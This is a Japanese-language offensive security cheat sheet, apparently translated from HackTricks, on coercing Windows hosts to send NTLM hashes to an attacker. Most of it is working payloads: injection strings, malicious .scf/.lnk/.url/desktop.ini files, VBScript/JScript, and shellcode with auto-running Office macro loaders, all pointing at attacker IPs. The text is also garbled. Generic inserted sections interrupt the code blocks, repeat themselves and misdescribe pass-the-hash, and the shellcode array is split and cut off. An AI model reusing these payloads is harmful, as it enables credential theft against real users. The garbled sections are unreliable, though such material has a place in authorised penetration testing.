# NTLMクレデンシャルを盗む場所

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ HackTricksで**会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。これは、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出**してください。

</details>

## 自動ペイロードの作成とその他のリスト

### [ntlm\_theft](https://github.com/Greenwolf/ntlm\_theft)

このツールは、ユーザーがアクセスすると、**攻撃者とのNTLM認証が開始される**いくつかのドキュメント/ファイルを作成します。

#### ntlm\_theftは、次の攻撃タイプをサポートしています：

フォルダを参照：

* .url – URLフィールド経由
* .url – ICONFILEフィールド経由
* .lnk - icon\_locationフィールド経由
* .scf – ICONFILEフィールド経由（最新のWindowsでは動作しません）
* autorun.inf – OPENフィールド経由（最新のWindowsでは動作しません）
* desktop.ini - IconResourceフィールド経由（最新のWindowsでは動作しません）

ドキュメントを開く：

* .xml – Microsoft Wordの外部スタイルシート経由
* .xml – Microsoft Wordのincludepictureフィールド経由
* .htm – Chrome＆IE＆Edgeのimg src経由（ローカルで開かれた場合のみ、ホストされていない場合は開かれません）
*   .docx – Microsoft Wordのincludepictureフィールド経由

\-.docx – Microsoft Wordの外部テンプレート経由

\-.docx – Microsoft Wordのframeset webSettings経由

\-.xlsx - Microsoft Excelの外部セル経由

\-.wax - Windows Media Playerのプレイリスト経由（より良い、主要なオープン）

\-.asx – Windows Media Playerのプレイリスト経由（より良い、主要なオープン）

\-.m3u – Windows Media Playerのプレイリスト経由（悪い、Win10では最初にGroovyで開かれます）

\-.jnlp – Javaの外部jar経由

\-.application – 任意のブラウザ経由（ブラウザ経由で提供されない場合は実行されません）

ドキュメントを開き、ポップアップを受け入れる：

* .pdf – Adobe Acrobat Reader経由

チャットプログラムでリンクをクリック：

* .txt – Zoomチャットに貼り付けるためのフォーマットされたリンク

> 例：
>
> ```bash
> # python3 ntlm_theft.py -g all -s 127.0.0.1 -f test
> Created: test/test.scf (BROWSE)
> Created: test/test-(url).url (BROWSE)
> Created: test/test-(icon).url (BROWSE)
> Created: test/test.rtf (OPEN)
> Created: test/test-(stylesheet).xml (OPEN)
> Created: test/test-(fulldocx).xml (OPEN)
> Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
> Created: test/test-(includepicture).docx (OPEN)
> Created: test/test-(remotetemplate).docx (OPEN)
> Created: test/test-(frameset).docx (OPEN)
> Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
> Created: test/test.asx (OPEN)
> Created: test/test.jnlp (OPEN)
> Created: test/test.application (DOWNLOAD AND OPEN)
> Created: test/test.pdf (OPEN AND ALLOW)
> Created: test/zoom-attack-instructions.txt (PASTE TO CHAT)
> Generation Complete.
> ```

### [All\_NTLM-Leak](https://github.com/Gl3bGl4z/All\_NTLM\_leak)

> チートシート

これは、被害者からクレデンシャルを盗むためのNTLM認証を強制するための技術のリストです。

### NTLM特権認証の強制

特権アカウントを使用して、Windowsマシンを**任意のマシンに認証させる**ことができる場合があります。詳細については、次のページを参照してください：

{% content-ref url="../active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

## LFI

PHPのinclude()は、ネットワークパスを解決してくれます。
```
http://host.tld/?page=//11.22.33.44/@OsandaMalith
```
![](<../../.gitbook/assets/image (642).png>)

## XXE

ここでは、ネットワークパスを解決するために「php://filter/convert.base64-encode/resource=」を使用しています。
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=//11.22.33.44/@OsandaMalith" >
]>
<root>
<name></name>
<tel></tel>
<email>OUT&xxe;OUT</email>
<password></password>
</root>
```
![](<../../.gitbook/assets/image (618).png>)

## XPathインジェクション

通常、doc()はオフバンドのXPathインジェクションで使用され、ネットワークパスの解決に適用することができます。
```
http://host.tld/?title=Foundation&type=*&rent_days=* and doc('//35.164.153.224/@OsandaMalith')
```
![](<../../.gitbook/assets/image (638) (2).png>)

## MySQLインジェクション

私はMySQLのオフバンドインジェクションについての完全な[記事](https://osandamalith.com/2017/02/03/mysql-out-of-band-hacking/)を書きました。これはインターネット上で適用できます。また、ネットワークパスを解決するために 'INTO OUTFILE' を使用することもできます。
```
http://host.tld/index.php?id=1’ union select 1,2,load_file(‘\\\\192.168.0.100\\@OsandaMalith’),4;%00
```
![](<../../.gitbook/assets/image (663).png>)

## MSSQL

スタックされたクエリがサポートされているため、ストアドプロシージャを呼び出すことができます。
```
';declare @q varchar(99);set @q='\\192.168.254.52\test'; exec master.dbo.xp_dirtree @q
```
## Regsvr32

.sctファイルを実験している間に偶然これを見つけました。
```
regsvr32 /s /u /i://35.164.153.224/@OsandaMalith scrobj.dll
```
## バッチ

探索できる可能性のある方法は多数あります。
```
echo 1 > //192.168.0.1/abc
pushd \\192.168.0.1\abc
cmd /k \\192.168.0.1\abc
cmd /c \\192.168.0.1\abc
start \\192.168.0.1\abc
mkdir \\192.168.0.1\abc
type\\192.168.0.1\abc
dir\\192.168.0.1\abc
find, findstr, [x]copy, move, replace, del, rename and many more!
```
## 自動補完

エクスプローラーや実行ダイアログボックスで、単に「\host\」と入力するだけで自動補完が機能します。

![](<../../.gitbook/assets/image (660).png>)

![](<../../.gitbook/assets/image (637).png>)

## Autorun.inf

Windows 7以降、この機能は無効になっています。ただし、Autorunのグループポリシーを変更することで有効にすることができます。Autorun.infファイルを非表示にするようにしてください。
```
[autorun]
open=\\35.164.153.224\setup.exe
icon=something.ico
action=open Setup.exe
```
## シェルコマンドファイル

認証されていないユーザーに与えられた書き込み権限によって、ドメインユーザーのパスワードハッシュやシェルを取得することが可能です。SCF（シェルコマンドファイル）は、Windowsデスクトップの表示やWindows Explorerの起動など、一部の操作を実行することができます。以下のコードを`ordinary.scf`として保存し、ネットワーク共有に配置してください。
```
[Shell]
Command=2
IconFile=\\AttackerIP\ordinary.ico
[Taskbar]
Command=ToggleDesktop
```
## Desktop.ini

desktop.iniファイルには、フォルダに適用されたアイコンの情報が含まれています。これを悪用してネットワークパスを解決することができます。フォルダを開くとハッシュが表示されるはずです。
```
mkdir openMe
attrib +s openMe
cd openMe
echo [.ShellClassInfo] > desktop.ini
echo IconResource=\\192.168.0.1\aa >> desktop.ini
attrib +s +h desktop.ini
```
Windows XPシステムでは、desktop.iniファイルは 'IconResource'の代わりに 'IcondFile'を使用します。
```
[.ShellClassInfo]
IconFile=\\192.168.0.1\aa
IconIndex=1337
```
## ショートカットファイル (.lnk)

ネットワークパスを含むショートカットを作成することができます。ショートカットを開くと、Windowsはネットワークパスを解決しようとします。ショートカットをトリガーするためのキーボードショートカットも指定できます。アイコンには、Windowsのバイナリの名前を指定するか、system32ディレクトリにあるshell32.dll、Ieframe.dll、imageres.dll、pnidui.dll、またはwmploc.dllからアイコンを選択することができます。
```powershell
Set shl = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
currentFolder = shl.CurrentDirectory

Set sc = shl.CreateShortcut(fso.BuildPath(currentFolder, "\StealMyHashes.lnk"))

sc.TargetPath = "\\35.164.153.224\@OsandaMalith"
sc.WindowStyle = 1
sc.HotKey = "Ctrl+Alt+O"
sc.IconLocation = "%windir%\system32\shell32.dll, 3"
sc.Description = "I will Steal your Hashes"
sc.Save
```
Powershellのバージョン。
```powershell
#TargetPath attack
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("StealMyHashes.lnk")
$lnk.TargetPath = "\\35.164.153.224\@OsandaMalith"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "I will Steal your Hashes"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()

#IconLocation Attack
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc\software\test.lnk")
$shortcut.IconLocation = "\\10.10.10.10\test.ico"
$shortcut.Save()
```
## インターネットショートカット (.url)

Windowsのもう一つのショートカットは、インターネットショートカットです。これを`something.url`として保存することができます。
```bash
echo [InternetShortcut] > stealMyHashes.url
echo URL=file://192.168.0.1/@OsandaMalith >> stealMyHashes.url
```
## レジストリを使用した自動実行

次のいずれかのパスに新しいレジストリキーを追加することができます。
```
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
```
![](<../../.gitbook/assets/image (307) (5).png>)

## Powershell

おそらく、Powershellにはネットワークパスを解決するための多くのスクリプトレットが存在するでしょう。
```
Invoke-Item \\192.168.0.1\aa
Get-Content \\192.168.0.1\aa
Start-Process \\192.168.0.1\aa
```
## IE

IEはUNCパスを解決します。例えば、以下のようなUNCパスを解決します。
```html
<img src="\\\\192.168.0.1\\aa">
```
以下の場所でNTLM資格情報を盗むことができます。XSSの下にインジェクトするか、SQLインジェクションのシナリオで使用することができます。例えば、以下のような場所です。
```
http://host.tld/?id=-1' union select 1,'<img src="\\\\192.168.0.1\\aa">';%00
```
## VBScript

これを.vbsとして保存するか、WordやExcelファイルに適用されるマクロの中で使用することができます。
```bash
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("//192.168.0.100/aa", 1)
```
あなたはWebページに適用することができますが、これはIEでのみ動作します。
```markup
<html>
<script type="text/Vbscript">
<!--
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("//192.168.0.100/aa", 1)
//-->
</script>
</html>
```
以下はエンコードされたバージョンです。これをエンコードして、something.vbeとして保存できます。
```
#@~^ZQAAAA==jY~6?}'ZM2mO2}4%+1YcEUmDb2YbxocorV?H/O+h6(LnmDE#=?nO,sksn{0dWcGa+U:+XYsbVcJJzf*cF*cF*2  yczmCE~8#XSAAAA==^#~@
```
これはHTMLファイルにも適用できます。ただし、IEでのみ動作します。これをsomething.htaとして保存することができます。これはWindowsのHTMLアプリケーションであり、mshta.exeが実行します。デフォルトではIEが使用されます。
```
<html>
<script type="text/Vbscript.Encode">
<!--
#@~^ZQAAAA==jY~6?}'ZM2mO2}4%+1YcEUmDb2YbxocorV?H/O+h6(LnmDE#=?nO,sksn{0dWcGa+U:+XYsbVcJJzf*cF*cF*2  yczmCE~8#XSAAAA==^#~@
//-->
</script>
</html>
```
## JScript

これをWindowsの下にsomething.jsとして保存できます。
```javascript
var fso = new ActiveXObject("Scripting.FileSystemObject")
fso.FileExists("//192.168.0.103/aa")
```
同じことをhtmlファイルに適用することもできますが、IEでのみ動作します。また、これをsomething.htaとして保存することもできます。
```markup
<html>
<script type="text/Jscript">
<!--
var fso = new ActiveXObject("Scripting.FileSystemObject")
fso.FileExists("//192.168.0.103/aa")
//-->
</script>
</html>
```
以下はエンコードされたバージョンです。これをsomething.jseとして保存できます。
```
#@~^XAAAAA==-mD~6/K'xh,)mDk-+or8%mYvE?1DkaOrxTRwks+jzkYn:}8LmOE*i0dGcsrV3XkdD/vJzJFO+R8v0RZRqT2zlmE#Ux4AAA==^#~@
```
以下は、NTLM資格情報を盗むための場所に関する情報です。

# NTLM資格情報を盗むための場所

NTLM資格情報を盗むために攻撃者が悪用できる場所はいくつかあります。以下にそれらの場所を示します。

## メモリ

メモリは、NTLMハッシュや平文のパスワードを含む可能性があります。攻撃者は、メモリ内のこれらの情報を抽出することで、NTLM資格情報を盗むことができます。

### LSASSプロセス

LSASS（Local Security Authority Subsystem Service）プロセスは、Windowsの認証情報を管理するために使用されます。攻撃者は、LSASSプロセスのメモリをダンプすることで、NTLMハッシュを取得することができます。

### システムメモリ

システムメモリには、ログオンセッションや認証情報が一時的に格納されることがあります。攻撃者は、システムメモリ内のこれらの情報を抽出することで、NTLM資格情報を盗むことができます。

## ネットワーク

ネットワーク上でもNTLM資格情報を盗むことができます。以下にいくつかの例を示します。

### NTLM認証のリクエスト

NTLM認証のリクエストは、ネットワーク上で送信されるため、攻撃者はこれを傍受してNTLMハッシュを取得することができます。

### NTLM認証の応答

NTLM認証の応答もネットワーク上で送信されるため、攻撃者はこれを傍受してNTLMハッシュを取得することができます。

### NTLM認証のキャプチャ

ネットワーク上のトラフィックをキャプチャすることで、NTLM認証のリクエストや応答を取得することができます。攻撃者は、キャプチャしたトラフィックからNTLMハッシュを抽出することができます。

## ローカルストレージ

ローカルストレージには、NTLMハッシュや平文のパスワードが保存されることがあります。攻撃者は、ローカルストレージ内のこれらの情報を抽出することで、NTLM資格情報を盗むことができます。

### SAMファイル

SAM（Security Account Manager）ファイルは、Windowsのユーザーアカウント情報を保存するために使用されます。攻撃者は、SAMファイルからNTLMハッシュを取得することができます。

### Credential Manager

Credential Managerは、Windowsの認証情報を保存するために使用されます。攻撃者は、Credential ManagerからNTLMハッシュや平文のパスワードを取得することができます。

以上が、NTLM資格情報を盗むための場所の一部です。攻撃者はこれらの場所を悪用することで、NTLM資格情報を入手することができます。
```markup
<html>
<script type="text/Jscript.Encode">
<!--
#@~^XAAAAA==-mD~6/K'xh,)mDk-+or8%mYvE?1DkaOrxTRwks+jzkYn:}8LmOE*i0dGcsrV3XkdD/vJzJFO+R8v0RZRqT2zlmE#Ux4AAA==^#~@
//-->
</script>
</html>
```
## Windowsスクリプトファイル

これをsomething.wsfとして保存してください。
```markup
<package>
<job id="boom">
<script language="VBScript">
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("//192.168.0.100/aa", 1)
</script>
</job>
</package>
```
## シェルコード

以下は私が作成した小さなシェルコードです。このシェルコードはCreateFileを使用し、存在しないネットワークパスを読み取ろうとします。Responderなどのツールを使用してNetNTLMハッシュをキャプチャすることができます。シェルコードはインターネット上でハッシュを盗むために変更することもできます。また、SMBRelay攻撃も実行できます。
```cpp
/*
Title: CreateFile Shellcode
Author: Osanda Malith Jayathissa (@OsandaMalith)
Website: https://osandamalith.com
Size: 368 Bytes
*/
# include <stdlib.h>
# include <stdio.h>
# include <string.h>
# include <windows.h>

int main() {

char *shellcode =
"\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x4c\x03\x02\x02\x81\xf1\x02\x02"
"\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x05\x0f\x44\xc6\xaa"
"\xe2\xf6\xe8\x05\x05\x05\x05\x5e\x8b\xfe\x81\xc6\x29\x01\x05\x05"
"\xb9\x02\x05\x05\x05\xfc\xad\x01\x3c\x07\xe2\xfa\x56\xb9\x8d\x10"
"\xb7\xf8\xe8\x5f\x05\x05\x05\x68\x31\x01\x05\x05\xff\xd0\xb9\xe0"
"\x53\x31\x4b\xe8\x4e\x05\x05\x05\xb9\xac\xd5\xaa\x88\x8b\xf0\xe8"
"\x42\x05\x05\x05\x6a\x05\x68\x80\x05\x05\x05\x6a\x03\x6a\x05\x6a"
"\x01\x68\x05\x05\x05\x80\x68\x3e\x01\x05\x05\xff\xd0\x6a\x05\xff"
"\xd6\x33\xc0\x5e\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c\x61\x0f\xbe"
"\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0\x75\xea\x8b"
"\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53\x56\x57\x89"
"\x4d\xf4\x64\xa1\x30\x05\x05\x05\x89\x45\xfc\x8b\x45\xfc\x8b\x40"
"\x0c\x8b\x40\x14\x89\x45\xec\x8b\xf8\x8b\xcf\xe8\xd2\xff\xff\xff"
"\x8b\x70\x18\x8b\x3f\x85\xf6\x74\x4f\x8b\x46\x3c\x8b\x5c\x30\x78"
"\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff\xff\xff\x8b"
"\x4c\x33\x20\x89\x45\xf8\x33\xc0\x03\xce\x89\x4d\xf0\x89\x45\xfc"
"\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75\xff\xff\xff"
"\x03\x45\xf8\x39\x45\xf4\x74\x1c\x8b\x45\xfc\x8b\x4d\xf0\x40\x89"
"\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c\x33\xc0\x5f"
"\x5e\x5b\xc9\xc3\x8b\x4d\xfc\x8b\x44\x33\x24\x8d\x04\x48\x0f\xb7"
"\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04\x30\x03\xc6\xeb\xdf"
"\x21\x05\x05\x05\x50\x05\x05\x05\x6b\x65\x72\x6e\x65\x6c\x33\x32"
"\x2e\x64\x6c\x6c\x05\x2f\x2f\x65\x72\x72\x6f\x72\x2f\x61\x61\x05";

DWORD oldProtect;

wprintf(L"Length : %d bytes\n@OsandaMalith", strlen(shellcode));
BOOL ret = VirtualProtect (shellcode, strlen(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect);

if (!ret) {
fprintf(stderr, "%s", "Error Occured");
return EXIT_FAILURE;
}

((void(*)(void))shellcode)();

VirtualProtect (shellcode, strlen(shellcode), oldProtect, &oldProtect);

return EXIT_SUCCESS;
}
```
[https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html](https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html)

## マクロ内のシェルコード

上記のシェルコードは、Word/Excelマクロ内で使用されています。同じコードをVB6アプリケーション内でも使用することができます。
```basic
' Author : Osanda Malith Jayathissa (@OsandaMalith)
' Title: Shellcode to request a non-existing network path
' Website: https://osandamalith
' Shellcode : https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html
' This is a word/excel macro. This can be used in vb6 applications as well

#If Vba7 Then
Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
ByVal lpThreadAttributes As Long, _
ByVal dwStackSize As Long, _
ByVal lpStartAddress As LongPtr, _
lpParameter As Long, _
ByVal dwCreationFlags As Long, _
lpThreadId As Long) As LongPtr


Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
ByVal lpAddress As Long, _
ByVal dwSize As Long, _
ByVal flAllocationType As Long, _
ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
ByVal Destination  As LongPtr, _
ByRef Source As Any, _
ByVal Length As Long) As LongPtr

#Else
Private Declare Function CreateThread Lib "kernel32" ( _
ByVal lpThreadAttributes As Long, _
ByVal dwStackSize As Long, _
ByVal lpStartAddress As Long, _
lpParameter As Long, _
ByVal dwCreationFlags As Long, _
lpThreadId As Long) As Long

Private Declare Function VirtualAlloc Lib "kernel32" ( _
ByVal lpAddress As Long, _
ByVal dwSize As Long, _
ByVal flAllocationType As Long, _
ByVal flProtect As Long) As Long

Private Declare Function RtlMoveMemory Lib "kernel32" ( _
ByVal Destination As Long, _
ByRef Source As Any, _
ByVal Length As Long) As Long
#EndIf

Const MEM_COMMIT = &H1000
Const PAGE_EXECUTE_READWRITE = &H40

Sub Auto_Open()
Dim source As Long, i As Long
#If Vba7 Then
Dim  lpMemory As LongPtr, lResult As LongPtr
#Else
Dim  lpMemory As Long, lResult As Long
#EndIf

Dim bShellcode(376) As Byte
bShellcode(0) = 232
bShellcode(1) = 255
bShellcode(2) = 255
bShellcode(3) = 255
bShellcode(4) = 255
bShellcode(5) = 192
bShellcode(6) = 95
bShellcode(7) = 185
bShellcode(8) = 85
bShellcode(9) = 3
bShellcode(10) = 2
bShellcode(11) = 2
bShellcode(12) = 129
bShellcode(13) = 241
bShellcode(14) = 2
bShellcode(15) = 2
bShellcode(16) = 2
.....................
lpMemory = VirtualAlloc(0, UBound(bShellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
For i = LBound(bShellcode) To UBound(bShellcode)
source = bShellcode(i)
lResult = RtlMoveMemory(lpMemory + i, source, 1)
Next i
lResult = CreateThread(0, 0, lpMemory, 0, 0, 0)
End Sub
Sub AutoOpen()
Auto_Open
End Sub
Sub Workbook_Open()
Auto_Open
End Sub
```
[https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.vba](https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.vba)

## VBSとJS内のシェルコード

subTeeはJSとDynamicWrapperXを使用したさまざまな研究を行っています。DynamicWrapperX DLLを使用したPOCを見つけることができます。\
[http://subt0x10.blogspot.com/2016/09/shellcode-via-jscript-vbscript.html](http://subt0x10.blogspot.com/2016/09/shellcode-via-jscript-vbscript.html)\
それに基づいて、私はシェルコードをJSとVBSに移植しました。面白い部分は、シェルコードをJScriptまたはVBScriptでhtmlや.hta形式の中に埋め込むことができることです。\
次のシェルコードは私のIPに向けられていることに注意してください。

#### JScript
```javascript
/*
* Author : Osanda Malith Jayathissa (@OsandaMalith)
* Title: Shellcode to request a non-existing network path
* Website: https://osandamalith.com
* Shellcode : https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html
* Based on subTee's JS: https://gist.github.com/subTee/1a6c96df38b9506506f1de72573ceb04
*/
DX = new ActiveXObject("DynamicWrapperX");
DX.Register("kernel32.dll", "VirtualAlloc", "i=luuu", "r=u");
DX.Register("kernel32.dll","CreateThread","i=uullu","r=u" );
DX.Register("kernel32.dll", "WaitForSingleObject", "i=uu", "r=u");

var MEM_COMMIT = 0x1000;
var PAGE_EXECUTE_READWRITE = 0x40;

var sc = [
0xe8, 0xff, 0xff, 0xff, 0xff, 0xc0, 0x5f, 0xb9, 0x55, 0x03, 0x02, 0x02, 0x81, 0xf1, 0x02, 0x02, 0x02, 0x02, 0x83, 0xc7,
0x1d, 0x33, 0xf6, 0xfc, 0x8a, 0x07, 0x3c, 0x05, 0x0f, 0x44, 0xc6, 0xaa, 0xe2, 0xf6, 0xe8, 0x05, 0x05, 0x05, 0x05, 0x5e,
0x8b, 0xfe, 0x81, 0xc6, 0x29, 0x01, 0x05, 0x05, 0xb9, 0x02, 0x05, 0x05, 0x05, 0xfc, 0xad, 0x01, 0x3c, 0x07, 0xe2, 0xfa,
0x56, 0xb9, 0x8d, 0x10, 0xb7, 0xf8, 0xe8, 0x5f, 0x05, 0x05, 0x05, 0x68, 0x31, 0x01, 0x05, 0x05, 0xff, 0xd0, 0xb9, 0xe0,
0x53, 0x31, 0x4b, 0xe8, 0x4e, 0x05, 0x05, 0x05, 0xb9, 0xac, 0xd5, 0xaa, 0x88, 0x8b, 0xf0, 0xe8, 0x42, 0x05, 0x05, 0x05,
0x6a, 0x05, 0x68, 0x80, 0x05, 0x05, 0x05, 0x6a, 0x03, 0x6a, 0x05, 0x6a, 0x01, 0x68, 0x05, 0x05, 0x05, 0x80, 0x68, 0x3e,
0x01, 0x05, 0x05, 0xff, 0xd0, 0x6a, 0x05, 0xff, 0xd6, 0x33, 0xc0, 0x5e, 0xc3, 0x33, 0xd2, 0xeb, 0x10, 0xc1, 0xca, 0x0d,
0x3c, 0x61, 0x0f, 0xbe, 0xc0, 0x7c, 0x03, 0x83, 0xe8, 0x20, 0x03, 0xd0, 0x41, 0x8a, 0x01, 0x84, 0xc0, 0x75, 0xea, 0x8b,
0xc2, 0xc3, 0x8d, 0x41, 0xf8, 0xc3, 0x55, 0x8b, 0xec, 0x83, 0xec, 0x14, 0x53, 0x56, 0x57, 0x89, 0x4d, 0xf4, 0x64, 0xa1,
0x30, 0x05, 0x05, 0x05, 0x89, 0x45, 0xfc, 0x8b, 0x45, 0xfc, 0x8b, 0x40, 0x0c, 0x8b, 0x40, 0x14, 0x89, 0x45, 0xec, 0x8b,
0xf8, 0x8b, 0xcf, 0xe8, 0xd2, 0xff, 0xff, 0xff, 0x8b, 0x70, 0x18, 0x8b, 0x3f, 0x85, 0xf6, 0x74, 0x4f, 0x8b, 0x46, 0x3c,
0x8b, 0x5c, 0x30, 0x78, 0x85, 0xdb, 0x74, 0x44, 0x8b, 0x4c, 0x33, 0x0c, 0x03, 0xce, 0xe8, 0x96, 0xff, 0xff, 0xff, 0x8b,
0x4c, 0x33, 0x20, 0x89, 0x45, 0xf8, 0x33, 0xc0, 0x03, 0xce, 0x89, 0x4d, 0xf0, 0x89, 0x45, 0xfc, 0x39, 0x44, 0x33, 0x18,
0x76, 0x22, 0x8b, 0x0c, 0x81, 0x03, 0xce, 0xe8, 0x75, 0xff, 0xff, 0xff, 0x03, 0x45, 0xf8, 0x39, 0x45, 0xf4, 0x74, 0x1c,
0x8b, 0x45, 0xfc, 0x8b, 0x4d, 0xf0, 0x40, 0x89, 0x45, 0xfc, 0x3b, 0x44, 0x33, 0x18, 0x72, 0xde, 0x3b, 0x7d, 0xec, 0x75,
```markdown
以下は、NTLM資格情報を盗むための場所に関する情報です。

## LSASSプロセス
LSASS（Local Security Authority Subsystem Service）プロセスは、Windowsのセキュリティ認証情報を管理する重要なプロセスです。このプロセスからNTLMハッシュを盗むことができます。

## LSASSメモリダンプ
LSASSプロセスのメモリダンプを取得することで、NTLMハッシュを含む資格情報を取得できます。ツールや手法を使用してメモリダンプを取得し、解析することができます。

## NTDS.ditファイル
NTDS.ditファイルは、Active Directoryデータベースファイルであり、ユーザーのNTLMハッシュを含んでいます。このファイルを取得し、解析することでNTLMハッシュを取得できます。

## SAMファイル
SAMファイルは、Windowsのローカルアカウントの認証情報を格納しています。このファイルを取得し、解析することでNTLMハッシュを取得できます。

## ネットワークトラフィック
NTLM認証はネットワークトラフィック上でやり取りされるため、ネットワークトラフィックをキャプチャし、解析することでNTLMハッシュを取得できます。

## パスワードリスト攻撃
パスワードリスト攻撃を使用して、既知のパスワードを使用してNTLMハッシュを解読することができます。

## パスザハッシュ攻撃
パスザハッシュ攻撃を使用して、既知のNTLMハッシュを使用してパスワードを解読することができます。

## パスザチケット攻撃
パスザチケット攻撃を使用して、既知のNTLMハッシュを使用してチケットを生成し、認証をバイパスすることができます。

## パスザキー攻撃
パスザキー攻撃を使用して、既知のNTLMハッシュを使用してキーを生成し、認証をバイパスすることができます。

## パスザハッシュ攻撃
パスザハッシュ攻撃を使用して、既知のNTLMハッシュを使用してパスワードを解読することができます。

## パスザチケット攻撃
パスザチケット攻撃を使用して、既知のNTLMハッシュを使用してチケットを生成し、認証をバイパスすることができます。

## パスザキー攻撃
パスザキー攻撃を使用して、既知のNTLMハッシュを使用してキーを生成し、認証をバイパスすることができます。
```

```html
<script>
var sc = [0x9c, 0x33, 0xc0, 0x5f, 0x5e, 0x5b, 0xc9, 0xc3, 0x8b, 0x4d, 0xfc, 0x8b, 0x44, 0x33, 0x24, 0x8d, 0x04, 0x48, 0x0f, 0xb7,
0x0c, 0x30, 0x8b, 0x44, 0x33, 0x1c, 0x8d, 0x04, 0x88, 0x8b, 0x04, 0x30, 0x03, 0xc6, 0xeb, 0xdf, 0x21, 0x05, 0x05, 0x05,
0x50, 0x05, 0x05, 0x05, 0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x05, 0x2f, 0x2f, 0x33,
0x35, 0x2e, 0x31, 0x36, 0x34, 0x2e, 0x31, 0x35, 0x33, 0x2e, 0x32, 0x32, 0x34, 0x2f, 0x61, 0x61, 0x05];

var scLocation = DX.VirtualAlloc(0, sc.length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
for(var i = 0; i < sc.length; i++) DX.NumPut(sc[i],scLocation,i);
var thread = DX.CreateThread(0,0,scLocation,0,0);
</script>
```
[https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.js](https://github.com/OsandaMalith/Shellcodes/blob/master/CreateFile/CreateFile.js)

#### VBScript
```vba
' Author : Osanda Malith Jayathissa (@OsandaMalith)
' Title: Shellcode to request a non-existing network path
' Website: https://osandamalith.com
' Shellcode : https://packetstormsecurity.com/files/141707/CreateFile-Shellcode.html
' Based on subTee's JS: https://gist.github.com/subTee/1a6c96df38b9506506f1de72573ceb04

Set DX = CreateObject("DynamicWrapperX")
DX.Register "kernel32.dll", "VirtualAlloc", "i=luuu", "r=u"
DX.Register "kernel32.dll","CreateThread","i=uullu","r=u"
DX.Register "kernel32.dll", "WaitForSingleObject", "i=uu", "r=u"

Const MEM_COMMIT = &H1000
Const PAGE_EXECUTE_READWRITE = &H40

shellcode = Array( _
